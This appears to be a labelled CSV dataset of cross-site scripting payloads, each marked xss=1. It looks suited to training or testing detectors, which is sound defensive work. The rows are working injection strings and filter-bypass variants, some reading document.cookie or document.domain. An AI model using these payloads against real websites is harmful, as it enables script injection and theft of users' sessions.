payload,xss
<button popovertarget=x>Click me</button><picture ontoggle=alert(1) popover id=x>AnonKryptiQuz</picture>,1
"<dialog draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dialog>",1
"<noembed draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",1
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable style=display:block>drop here</listing>",1
"<style>:target {transform: rotate(180deg);}</style><slot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></slot>",1
"<noscript onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",1
"<dialog oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",1
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable style=display:block>drop here</thead>",1
"<fieldset draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",1
"<summary onmouseup=""alert(1)"">AnonKryptiQuz</summary>",1
"<table onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</table>",1
"""><img src=x onerror='alert(document.domain)'>",1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1
%3E%3Cbody%20onload=javascript:alert(1)%3E,1
"<ul oncontextmenu=""alert(1)"">AnonKryptiQuz</ul>",1
<strike onpointerdown=alert(1) style=display:block>AnonKryptiQuz</strike>,1
"javascript://'//"" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*",1
<button popovertarget=x>Click me</button><input3 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</input3>,1
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,1
<section onpointerenter=alert(1) style=display:block>AnonKryptiQuz</section>,1
<nav onpointerdown=alert(1) style=display:block>AnonKryptiQuz</nav>,1
"breakout""/href=""javas%26%23x63 ;ript:selffalx\ert%'.replace(/x/,""]()""",1
"<input4 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></input4>",1
"<xmp ondblclick=""alert(1)"">AnonKryptiQuz</xmp>",1
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,1
"<menuitem onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",1
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionstart=alert(1)></summary>",1
"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('AnonKryptiQuz');\""&gt;",1
"<content draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</content>",1
"<head draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</head>",1
"<tfoot onmousedown=""alert(1)"">AnonKryptiQuz</tfoot>",1
<sup onbeforescriptexecute=alert(1)><script>1</script>,1
<button popovertarget=x>Click me</button><pre ontoggle=alert(1) popover id=x>AnonKryptiQuz</pre>,1
"""><img src=x ONERROR=prompt(document.domain);>",1
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",1
"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",1
"<x 1="">"" onxxx=1",1
"<rb draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</rb>",1
"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",1
"<label draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</label>",1
"<table oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<samp oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
setInterval('ale'+'rt(10)');,1
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
"<td onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</td>",1
"<sup onmouseleave=""alert(1)"">AnonKryptiQuz</sup>",1
"<source onclick=""alert(1)"" style=display:block>AnonKryptiQuz</source>",1
"<dialog onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",1
<colgroup onpointerup=alert(1) style=display:block>AnonKryptiQuz</colgroup>,1
"<article onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></article>",1
"<ruby onmouseover=""alert(1)"">AnonKryptiQuz</ruby>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""print()""></fieldset>",1
"<var onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</var>",1
<ruby onpointerleave=alert(1) style=display:block>AnonKryptiQuz</ruby>,1
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",1
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>,1
"<table onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</table>",1
"<multicol onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",1
"<acronym ondblclick=""alert(1)"">AnonKryptiQuz</acronym>",1
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelAnonKryptiQuz%26%2300000000000000000041//,1
#<img src=x onerror=URL='javascript:confirm(1)'>,1
"<hgroup draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</hgroup>",1
"<menuitem onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",1
<input4 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</input4><input value=clickme>,1
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f,1
"<hr oncontextmenu=""alert(1)"">AnonKryptiQuz</hr>",1
{{constructor.constructor(‘a=document;confirm(a.domain)’)()}},1
&#39;-alert(1)-&#39;,1
"x""><svg%0Donload=""window['alert']((document)['cookie'])"">",1
"<wbr onmousemove=""alert(1)"">AnonKryptiQuz</wbr>",1
"<dialog onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",1
<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>,1
"<figure onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",1
"<figcaption onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",1
"<i onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</i>",1
<tr onpointerout=alert(1) style=display:block>AnonKryptiQuz</tr>,1
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,1
<caption onmousewheel=alert(1) style=display:block>requires scrolling,1
"<strong onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",1
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></head>",1
"<article oncontextmenu=""alert(1)"">AnonKryptiQuz</article>",1
"<tbody draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",1
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable style=display:block>drop here</sup>",1
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,1
"<template onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</template>",1
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,1
"<li oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<base draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</base>",1
"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",1
"<map onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</map>",1
"<xmp onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",1
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,1
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></b>",1
<input3 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
<details onauxclick=confirm`AnonKryptiQuz`></details>,1
<div onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</div>,1
"<img/src=""funny.jpg""onload=javascript:eval(alert('Successful&#32AnonKryptiQuz'))>",1
"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></textarea>",1
"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",1
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>,1
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",1
"<menu oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",1
"<menuitem ondblclick=""alert(1)"">AnonKryptiQuz</menuitem>",1
<style onafterscriptexecute=alert(1)><script>1</script>,1
<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>,1
<element id=x tabindex=1 onfocus=alert(1)></element>,1
<set onpointerup=alert(1) style=display:block>AnonKryptiQuz</set>,1
"<div id=""134""><xmp>",1
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tfoot>",1
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1
"<style>@keyframes slidein {}</style><canvas style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></canvas>",1
"<span onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</span>",1
"<picture onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",1
"""><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--",1
"<input4 oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<em ondblclick=""alert(1)"">AnonKryptiQuz</em>",1
<button popovertarget=x>Click me</button><var ontoggle=alert(1) popover id=x>AnonKryptiQuz</var>,1
"<div id=""44""><style>*[{}@import'AnonKryptiQuz.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(AnonKryptiQuz.sct)"">//[""'`-->]]>]</div>",1
<center onafterscriptexecute=alert(1)><script>1</script>,1
"<rp id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></rp>",1
<image2 onfocus=alert(1) autofocus tabindex=1>,1
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",1
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",1
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,1
"""&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert(1)&amp;amp;amp;amp;gt;",1
"<figure onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",1
"<time draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</time>",1
%22;alert%28%27RVRSH3LL_XSS%29//,1
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,1
"<kbd oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",1
$ <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ------,1
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",1
"</style></script><script>alert(""AnonKryptiQuz"")</script>",1
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",1
"<wbr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",1
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable style=display:block>drop here</fieldset>",1
"<strong onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",1
<IMG+SRC=j&#X41vascript:alert(1)>,1
"<html onmousedown=""alert(1)"">AnonKryptiQuz</html>",1
"<datalist onmouseleave=""alert(1)"">AnonKryptiQuz</datalist>",1
<keygen onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</keygen><input value=clickme>,1
"<source draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</source>",1
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
"<noscript onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noscript>",1
this['alert'](),1
"<listing onmousemove=""alert(1)"">AnonKryptiQuz</listing>",1
"<style>:target {transform: rotate(180deg);}</style><content id=x style=""transition:transform 2s"" ontransitionrun=print()></content>",1
"<tbody onclick=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",1
<dialog onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</dialog><input value=clickme>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></optgroup>",1
"<map onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</map>",1
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable style=display:block>drop here</output>",1
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></wbr>",1
<pre onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</pre>,1
"<pre onmouseup=""alert(1)"">AnonKryptiQuz</pre>",1
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationend=""alert(1)""></strong>",1
"<rp oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",1
eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41))),1
<dt onpointerover=alert(1) style=display:block>AnonKryptiQuz</dt>,1
"<noembed onmouseover=""alert(1)"">AnonKryptiQuz</noembed>",1
"<dfn onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</dfn>",1
"<keygen oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<param onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></param>",1
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,1
"<main onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</main>",1
<progress onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</progress><input value=clickme>,1
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">",1
"<input type=image src onerror=""prompt(1)"">",1
"<dt draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",1
<em onmousewheel=alert(1) style=display:block>requires scrolling,1
<source onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</source><input value=clickme>,1
<code id=x tabindex=1 onfocus=alert(1)></code>,1
"<track onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</track>",1
"<main onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</main>",1
"<noembed onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",1
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionend=alert(1)></dfn>",1
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",1
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",1
"<figure ondblclick=""alert(1)"">AnonKryptiQuz</figure>",1
"<animatemotion onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",1
"<section onmouseover=""alert(1)"">AnonKryptiQuz</section>",1
"<meter onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></meter>",1
"<col onmouseover=""alert(1)"">AnonKryptiQuz</col>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style=""position:absolute;"" onanimationcancel=""print()""></var>",1
"<marquee onstart=""alert('AnonKryptiQuz')"">Start</marquee>",1
<fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>,1
"<map ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</map>",1
<svg/onload=%26%23097lert%26lpar;1337)>,1
"<menuitem onmouseover=""alert(1)"">AnonKryptiQuz</menuitem>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""print()""></rb>",1
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,1
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1
<select onchange=alert(1)><option>1<option>2,1
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onwebkitanimationend=""alert(1)""></a>",1
"<image onmouseleave=""alert(1)"">AnonKryptiQuz</image>",1
